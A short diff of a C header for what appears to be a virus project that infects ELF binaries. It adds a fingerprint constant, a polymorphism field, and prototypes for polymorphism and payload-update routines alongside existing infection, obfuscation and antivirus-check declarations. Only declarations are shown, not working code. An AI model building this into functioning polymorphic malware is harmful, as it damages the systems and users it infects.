@@ -17,6 +17,7 @@
 # include <sys/ptrace.h>
 
 # define KEY 0x42
+# define FINGERPRINT 0x43
 
 typedef struct s_war
 {
@@ -25,6 +26,7 @@ typedef struct s_war
     int             antivirus;
     char            *strtab;
     char            decrypted[1064];
+    char            polymorphism;
     const char      *binary;
     unsigned char   *elf;
     void            *signd;
@@ -45,5 +47,9 @@ int     ft_readelf(t_war *war);
 int     ft_is_infection(t_war *war);
 void    ft_obfuscation(t_war *war);
 void    ft_infect(t_war *war);
+void    ft_polymorphism(t_war *war);
+int     ft_couter(char *str);
+char    *ft_itoa(int numb);
+void    *ft_update_payload(t_war *war, char *str);
 
 #endif
